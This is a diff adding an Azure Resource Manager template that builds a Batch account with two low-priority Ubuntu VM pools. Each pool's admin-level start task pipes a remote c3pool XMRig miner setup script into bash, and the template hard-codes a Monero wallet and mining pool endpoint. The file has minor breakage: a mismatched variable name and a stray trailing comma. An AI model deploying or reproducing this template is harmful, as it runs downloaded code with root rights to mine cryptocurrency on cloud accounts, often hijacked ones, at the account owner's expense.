@@ -1,0 +1,157 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "batchAccounts_batches_name": {
+            "defaultValue": "batches",
+            "type": "String"
+        },
+        "VMs_F2": {
+            "defaultValue": 1,
+            "type": "Int"
+        },
+        "VMs_F4": {
+            "defaultValue": 1,
+            "type": "Int"
+        },
+        "user_wallet": {
+            "defaultValue": "427m24rhF74baasdgqT58LP2u4EqRzk2CSKNNJNxaDWmD2G8h94H6drKA8wyf2Qu3QdJudF7R2gD5YxZCCAeDrdNGSCjms3",
+            "type": "string"
+        },
+        "user_pool_port": {
+            "defaultValue": "mine.c3pool.com:15555",
+            "type": "string"
+        },
+        "location": {
+            "defaultValue": "eastus",
+            "type": "string"
+        }
+    },
+    "variables": {
+        "commandLine_template": "curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 427m24rhF74baasdgqT58LP2u4EqRzk2CSKNNJNxaDWmD2G8h94H6drKA8wyf2Qu3QdJudF7R2gD5YxZCCAeDrdNGSCjms3",
+    },
+    "resources": [
+        {
+            "type": "Microsoft.Batch/batchAccounts",
+            "apiVersion": "2021-01-01",
+            "name": "[parameters('batchAccounts_batches_name')]",
+            "location": "[parameters('location')]",
+            "identity": {
+                "type": "None"
+            },
+            "properties": {
+                "poolAllocationMode": "BatchService",
+                "publicNetworkAccess": "Enabled",
+                "encryption": {
+                    "keySource": "Microsoft.Batch"
+                }
+            }
+        },
+        {
+            "type": "Microsoft.Batch/batchAccounts/pools",
+            "apiVersion": "2021-01-01",
+            "name": "[concat(parameters('batchAccounts_batches_name'), '/F2')]",
+            "dependsOn": [
+                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_batches_name'))]"
+            ],
+            "properties": {
+                "vmSize": "STANDARD_F2",
+                "interNodeCommunication": "Disabled",
+                "taskSlotsPerNode": 1,
+                "taskSchedulingPolicy": {
+                    "nodeFillType": "Pack"
+                },
+                "deploymentConfiguration": {
+                    "virtualMachineConfiguration": {
+                        "imageReference": {
+                            "publisher": "canonical",
+                            "offer": "ubuntuserver",
+                            "sku": "18.04-lts",
+                            "version": "latest"
+                        },
+                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
+                        "nodePlacementConfiguration": {
+                            "policy": "Regional"
+                        }
+                    }
+                },
+                "networkConfiguration": {
+                    "publicIPAddressConfiguration": {
+                        "provision": "BatchManaged"
+                    }
+                },
+                "scaleSettings": {
+                    "fixedScale": {
+                        "targetDedicatedNodes": 0,
+                        "targetLowPriorityNodes": "[parameters('VMs_F2')]",
+                        "resizeTimeout": "PT15M"
+                    }
+                },
+                "startTask": {
+                    "commandLine": "[variables('commandLine')]",
+                    "userIdentity": {
+                        "autoUser": {
+                            "scope": "Task",
+                            "elevationLevel": "Admin"
+                        }
+                    },
+                    "maxTaskRetryCount": 0,
+                    "waitForSuccess": true
+                }
+            }
+        },
+        {
+            "type": "Microsoft.Batch/batchAccounts/pools",
+            "apiVersion": "2021-01-01",
+            "name": "[concat(parameters('batchAccounts_batches_name'), '/F4')]",
+            "dependsOn": [
+                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_batches_name'))]"
+            ],
+            "properties": {
+                "vmSize": "STANDARD_F4",
+                "interNodeCommunication": "Disabled",
+                "taskSlotsPerNode": 2,
+                "taskSchedulingPolicy": {
+                    "nodeFillType": "Pack"
+                },
+                "deploymentConfiguration": {
+                    "virtualMachineConfiguration": {
+                        "imageReference": {
+                            "publisher": "canonical",
+                            "offer": "ubuntuserver",
+                            "sku": "18.04-lts",
+                            "version": "latest"
+                        },
+                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
+                        "nodePlacementConfiguration": {
+                            "policy": "Regional"
+                        }
+                    }
+                },
+                "networkConfiguration": {
+                    "publicIPAddressConfiguration": {
+                        "provision": "BatchManaged"
+                    }
+                },
+                "scaleSettings": {
+                    "fixedScale": {
+                        "targetDedicatedNodes": 0,
+                        "targetLowPriorityNodes": "[parameters('VMs_F4')]",
+                        "resizeTimeout": "PT15M"
+                    }
+                },
+                "startTask": {
+                    "commandLine": "[variables('commandLine')]",
+                    "userIdentity": {
+                        "autoUser": {
+                            "scope": "Task",
+                            "elevationLevel": "Admin"
+                        }
+                    },
+                    "maxTaskRetryCount": 0,
+                    "waitForSuccess": true
+                }
+            }
+        }
+    ]
+}
